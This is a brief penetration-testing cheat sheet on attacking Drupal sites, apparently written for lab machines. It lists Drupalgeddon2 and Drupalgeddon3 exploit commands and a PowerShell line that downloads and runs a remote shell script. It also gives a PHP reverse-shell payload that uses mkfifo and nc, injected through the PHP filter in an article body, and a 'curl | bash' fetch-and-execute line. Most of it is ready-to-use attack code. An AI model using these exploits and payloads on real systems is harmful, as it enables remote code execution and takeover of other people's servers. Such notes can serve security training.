# Drupal

## Drupal

### Drupal Enumeration

We can use droopescan:

```bash
droopescan scan drupal -u http://10.10.10.102
```

Alternatively, we can use [drupalgeddon2.rb](https://github.com/dreadlocked/Drupalgeddon2) to enumerate and perform a vulnerability scan:

```
ruby drupalgeddon2.rb http://10.10.10.102/
```

There is also drupalgeddon3.

Here is an example of an RCE vulnerability in Drupal running in Windows:

```sh
python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/shell.ps1')"
```

### Drupal RCE

First: Modules -> Enable PHP filter&#x20;

Second: Add content -> Article

Then listen in a port of your choosing :

```
nc -lvnp 443
```

Afterward in the Drupal Article **Body** add this payload:

```bash
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
```

Next, in the **Text Format**, we select **PHP code.**

Finally, we click on the **Preview** button.

## Drupal Exploits

### Druppalgeddon

```
ruby druppalgeddon2.rb 10.10.10.233
> curl -s 10.10.14.20 | bash
```
